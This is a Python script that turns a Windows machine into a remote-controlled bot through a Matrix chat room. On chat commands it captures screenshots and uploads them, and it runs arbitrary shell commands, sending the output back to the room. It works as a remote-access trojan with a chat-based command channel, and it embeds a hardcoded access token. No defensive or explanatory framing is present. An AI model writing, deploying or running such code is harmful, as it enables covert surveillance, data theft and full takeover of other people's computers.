import requests
import subprocess
import time
import os
from mss import mss

ACCESS_TOKEN = "mct_6SNByYmWTBWRrspvYrVrJ9tEGfyFNq_c0MBd1"
ROOM_ID = "!oCVUgXhQCRpkGgwmSF:matrix.org"
IMG_PATH = r"C:\Users\Public\screenshot.png"
HEADERS = {"Authorization": f"Bearer {ACCESS_TOKEN}"}
BASE = "https://matrix.org/_matrix/client/v3"

def send_text(text):
    requests.post(f"{BASE}/rooms/{ROOM_ID}/send/m.room.message", headers=HEADERS, json={
        "msgtype": "m.text", "body": text
    })

def upload_and_send_image(path):
    with open(path, "rb") as f:
        r = requests.post("https://matrix.org/_matrix/media/v3/upload", headers={
            **HEADERS, "Content-Type": "image/png"
        }, data=f)
    uri = r.json().get("content_uri")
    if uri:
        requests.post(f"{BASE}/rooms/{ROOM_ID}/send/m.room.message", headers=HEADERS, json={
            "msgtype": "m.image", "body": "screenshot.png", "url": uri
        })

def take_screenshot():
    with mss() as sct:
        sct.shot(mon=1, output=IMG_PATH)

next_batch = None

# Get initial sync token without processing old messages
r = requests.get(f"{BASE}/sync", headers=HEADERS, params={"timeout": 0})
next_batch = r.json().get("next_batch")
print("Listening for commands...")

while True:
    r = requests.get(f"{BASE}/sync", headers=HEADERS, params={
        "since": next_batch,
        "timeout": 10000
    })
    data = r.json()
    next_batch = data.get("next_batch")

    rooms = data.get("rooms", {}).get("join", {})
    room = rooms.get(ROOM_ID, {})
    events = room.get("timeline", {}).get("events", [])

    for event in events:
        if event.get("type") != "m.room.message":
            continue
        body = event.get("content", {}).get("body", "").strip()
        sender = event.get("sender", "")
        print(f"{sender}: {body}")

        if body == "!send":
            take_screenshot()
            upload_and_send_image(IMG_PATH)

        elif body.startswith("!cmd "):
            cmd = body[5:]
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=15)
                send_text(f"```\n{output[:3000]}\n```")
            except subprocess.TimeoutExpired:
                send_text("Command timed out.")
            except subprocess.CalledProcessError as e:
                send_text(f"```\n{e.output[:3000]}\n```")
            except Exception as e:
                send_text(f"Error: {e}")
